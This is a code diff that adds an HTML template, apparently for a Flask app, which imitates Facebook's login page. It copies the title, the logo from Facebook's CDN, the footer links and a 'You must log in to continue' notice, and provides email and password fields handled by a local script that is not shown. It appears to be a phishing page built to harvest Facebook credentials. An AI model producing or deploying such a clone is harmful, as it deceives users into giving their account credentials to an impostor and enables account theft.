@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Log into Facebook</title>
+  <link rel="icon" href="favicon.ico?v=2" type="image/x-icon">
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+
+  
+</head>
+<body>
+
+
+
+  <div class="fb-logo-wrapper">
+    <img class="fb-logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
+  </div>
+  <i class="notice-icon"></i>
+
+  <div class="notice">You must log in to continue.</div>
+
+  <div class="container">
+    <div class="login-box">
+      <h2>Log Into Facebook</h2>
+      <div class="alert">You must log in to continue.</div>
+      <input type="text" id="login-email" placeholder="Email or phone number" />
+      <input type="password" id="login-password" placeholder="Password" />
+
+      <button id="loginBtn">Log In</button>
+      <a href="#" class="forgot" id="forgot-password-link">Forgot account?</a>
+      <div class="divider"><span>or</span></div>
+      <button id="new-create">Create new account</button>
+    </div>
+  </div>
+
+  <footer>
+    <div class="langs">
+      English (US) · नेपाली · हिन्दी · Español · Português (Brasil) · 日本語 · Français (France) · Deutsch · Italiano · العربية · 中文(简体) · <span class="plus">+</span>
+    </div>
+    <div class="footer-links">
+      Sign Up · Log In · Messenger · Facebook Lite · Video · Meta Pay · Meta Store · Meta Quest · Ray-Ban Meta · Meta AI · Instagram · Threads · Voting Info · Privacy · About · Create ad · Create Page · Developers · Careers · Cookies · Ad choices · Terms · Help
+    </div>
+  </footer>
+
+<script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
